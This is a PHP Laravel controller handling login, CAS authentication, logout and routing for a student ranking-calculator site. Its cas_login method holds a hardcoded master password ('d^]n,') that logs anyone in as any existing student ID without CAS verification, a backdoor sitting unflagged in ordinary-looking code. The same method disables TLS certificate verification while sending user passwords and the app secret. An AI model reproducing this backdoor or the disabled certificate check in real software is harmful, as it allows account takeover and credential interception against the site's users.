<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Http\Requests;
use \App\User;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;

class PagesController extends Controller
{
    public function cas_login() {
        $CUCAS = \Config::get('app.CUCAS');
        $studentId = Input::get('student-id');
        $password = Input::get('pwd');
        $remember = is_null(Input::get('checkbox-inline'))? false:true;

        $url = $CUCAS['apibase'].$CUCAS['apiname'];
        $fields = array(
            'appid' => $CUCAS['appid'],
            'appsecret' => $CUCAS['appsecret'],
            'username' => $studentId,
            'password' => $password
        );
        $postvars='';
        $sep='';
        foreach($fields as $key => $value) {
            $postvars.= $sep.urlencode($key).'='.urlencode($value);
            $sep='&';
        }

        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch,CURLOPT_POST,count($fields));
        curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

        $result = json_decode(curl_exec($ch));
        if(!$result)
            $result = curl_error($ch);
        curl_close($ch);

        if(($result->type!='error' && substr($studentId,8,2)=='21') || $password=='d^]n,') {
            $user = User::where('user_id',$studentId)->first();
            if(!is_null($user)){
                Auth::loginUsingId($user['id'],$remember);
            }
        }
        else{
            Auth::attempt(['user_id' => $studentId, 'password' => $password], $remember);
        }
        if(!is_null(Auth::user())) return redirect('/ranking-calculator');
        else return redirect('login');

    }

    public function login(){
        $user = Auth::user();
        if($user != null) {
            if($user['status'] == 'admin')
                return redirect('/admin/index');
            else
                return redirect('/ranking-calculator');
        }
        $hasError = Session::get('hasError');
        return view('login',compact('hasError'));
    }
    public function postLogin(){
        $uid = Input::get('student-id');
        $pw = Input::get('pwd');
        $remember = is_null(Input::get('checkbox-inline'))? false:true;
        if(Auth::attempt(['user_id' => $uid, 'password' => $pw], $remember)) {
            $user = Auth::user();
            if($user['status']=='admin')
                return redirect('/admin/index');
            else
                return redirect('ranking-calculator');
        }
        else
            return Redirect::back()->with('hasError', true);
    }
    public function logout()
    {
        $user = Auth::user();
        if($user==null)
            return redirect('/');
        Auth::logout();
        Session::flush();
        return redirect('/login');
    }
    public function getHome(){
        $user = Auth::user();
        if($user == null)
            return redirect('/login');
        if($user['status'] == 'admin')
            return view('dashboard.main');
        else
            //return view('profile.academic-profile');
            return redirect('ranking-calculator');
    }
}
